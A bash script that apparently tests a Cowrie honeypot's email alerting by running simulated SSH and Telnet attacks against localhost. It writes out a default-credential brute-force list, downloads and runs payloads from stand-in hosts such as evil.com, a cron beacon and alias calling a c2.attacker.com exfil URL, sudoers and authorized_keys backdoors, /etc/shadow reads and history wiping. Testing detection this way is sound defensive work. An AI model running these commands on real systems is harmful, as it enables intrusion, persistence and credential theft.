#!/bin/bash

echo "🎯 Generating Realistic Attack Scenarios for Email Alert Testing"
echo "================================================================"

# Install required tools
echo "📦 Installing required tools..."
sudo apt update >/dev/null 2>&1
sudo apt install -y sshpass expect >/dev/null 2>&1

# Function to simulate brute force attack
simulate_brute_force() {
    echo "🔐 Simulating SSH Brute Force Attack..."
    
    # Common credentials used by real attackers
    credentials=(
        "root:123456"
        "admin:admin"
        "root:password"
        "admin:password"
        "user:user"
        "root:root"
        "admin:123456"
        "guest:guest"
        "test:test"
        "ubuntu:ubuntu"
        "pi:raspberry"
        "oracle:oracle"
        "postgres:postgres"
        "mysql:mysql"
        "ftp:ftp"
    )
    
    for cred in "${credentials[@]}"; do
        username=$(echo $cred | cut -d: -f1)
        password=$(echo $cred | cut -d: -f2)
        
        echo "  🔑 Attempting $username:$password"
        
        timeout 8 sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -p 2222 "$username@localhost" << EOF 2>/dev/null
whoami
exit
EOF
        
        sleep 1
    done
}

# Function to simulate malware download attempts
simulate_malware_download() {
    echo "🦠 Simulating Malware Download Attempts..."
    
    # Login with common credentials and try to download malware
    timeout 15 sshpass -p "admin" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@localhost << 'EOF' 2>/dev/null
whoami
id
ls -la
cd /tmp
wget http://malicious.example.com/cryptominer.sh
curl -O http://evil.com/backdoor.elf
wget http://attacker.net/rootkit.tar.gz
chmod +x cryptominer.sh
chmod +x backdoor.elf
./cryptominer.sh
./backdoor.elf
exit
EOF

    sleep 2
}

# Function to simulate privilege escalation
simulate_privilege_escalation() {
    echo "⬆️ Simulating Privilege Escalation Attempts..."
    
    timeout 15 sshpass -p "password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 admin@localhost << 'EOF' 2>/dev/null
whoami
sudo su -
sudo -i
chmod +s /bin/bash
chmod 777 /etc/passwd
echo "admin ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
cat /etc/shadow
cat /etc/passwd
ps aux | grep root
netstat -tulpn
ss -tulpn
find / -perm -4000 2>/dev/null
find / -name "*.conf" 2>/dev/null | head -10
exit
EOF

    sleep 2
}

# Function to simulate reconnaissance
simulate_reconnaissance() {
    echo "🔍 Simulating System Reconnaissance..."
    
    timeout 15 sshpass -p "123456" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 user@localhost << 'EOF' 2>/dev/null
uname -a
cat /proc/version
cat /etc/os-release
lscpu
free -m
df -h
mount
lsblk
ifconfig
ip addr show
route -n
arp -a
cat /proc/net/tcp
cat /proc/net/udp
ps auxf
top -n 1
crontab -l
cat /etc/crontab
ls -la /var/spool/cron/
find /home -name "*.ssh" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null
cat ~/.bash_history
history
exit
EOF

    sleep 2
}

# Function to simulate persistence attempts
simulate_persistence() {
    echo "🔒 Simulating Persistence Attempts..."
    
    timeout 15 sshpass -p "guest" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 guest@localhost << 'EOF' 2>/dev/null
echo "* * * * * curl -s http://c2.attacker.com/beacon" >> /tmp/cron
crontab /tmp/cron
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil.com" >> ~/.ssh/authorized_keys
mkdir -p ~/.ssh
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
echo "alias ls='ls && curl -s http://c2.attacker.com/exfil'" >> ~/.bashrc
echo "export HISTFILE=/dev/null" >> ~/.bashrc
rm -f ~/.bash_history
history -c
exit
EOF

    sleep 2
}

# Function to simulate telnet attacks
simulate_telnet_attacks() {
    echo "📞 Simulating Telnet Attacks..."
    
    credentials=(
        "root:admin"
        "admin:password"
        "user:123456"
    )
    
    for cred in "${credentials[@]}"; do
        username=$(echo $cred | cut -d: -f1)
        password=$(echo $cred | cut -d: -f2)
        
        echo "  📞 Telnet attack: $username:$password"
        
        expect << EOF 2>/dev/null
spawn telnet localhost 2223
expect "login:" { send "$username\r" }
expect "Password:" { send "$password\r" }
expect "$ " { send "ls -la\r" }
expect "$ " { send "cat /etc/passwd\r" }
expect "$ " { send "ps aux\r" }
expect "$ " { send "wget http://evil.com/malware\r" }
expect "$ " { send "exit\r" }
expect eof
EOF
        
        sleep 2
    done
}

# Main execution
echo "🚀 Starting realistic attack simulation..."
echo "This will generate various types of attacks to test your email alert system."
echo ""

# Check if Cowrie is running
if ! pgrep -f cowrie > /dev/null; then
    echo "❌ Cowrie is not running. Please start it first."
    exit 1
fi

# Check if dashboard is running
if ! curl -s http://localhost:3000 > /dev/null; then
    echo "❌ Dashboard is not running. Please start it first."
    exit 1
fi

echo "✅ Prerequisites check passed. Starting attack simulation..."
echo ""

# Run attack simulations
simulate_brute_force
echo ""

simulate_malware_download
echo ""

simulate_privilege_escalation
echo ""

simulate_reconnaissance
echo ""

simulate_persistence
echo ""

simulate_telnet_attacks
echo ""

# Wait for logs to be processed
echo "⏳ Waiting for logs to be processed and alerts to be sent..."
sleep 10

# Check log file
LOG_PATH="${COWRIE_LOG_PATH:-./cowrie-logs/cowrie.json}"
if [ -f "$LOG_PATH" ]; then
    echo "📝 Log file status:"
    echo "   File: $LOG_PATH"
    echo "   Size: $(du -h "$LOG_PATH" | cut -f1)"
    echo "   Lines: $(wc -l < "$LOG_PATH")"
    
    if [ -s "$LOG_PATH" ]; then
        echo ""
        echo "📊 Recent attack events:"
        tail -5 "$LOG_PATH" | jq -r '.timestamp + " | " + .src_ip + " | " + .eventid' 2>/dev/null || tail -5 "$LOG_PATH"
    fi
else
    echo "❌ Log file not found: $LOG_PATH"
fi

echo ""
echo "✅ Attack simulation complete!"
echo ""
echo "📧 Check your email for alert notifications!"
echo "📊 View the dashboard: http://localhost:3000"
echo "🚨 Check alert status: http://localhost:3000/alerts"
echo ""
echo "🎯 Attack Summary:"
echo "   • SSH Brute Force: 15+ login attempts"
echo "   • Malware Downloads: wget/curl attempts"
echo "   • Privilege Escalation: sudo/chmod attempts"
echo "   • System Reconnaissance: system enumeration"
echo "   • Persistence: cron/ssh key attempts"
echo "   • Telnet Attacks: 3 telnet login attempts"
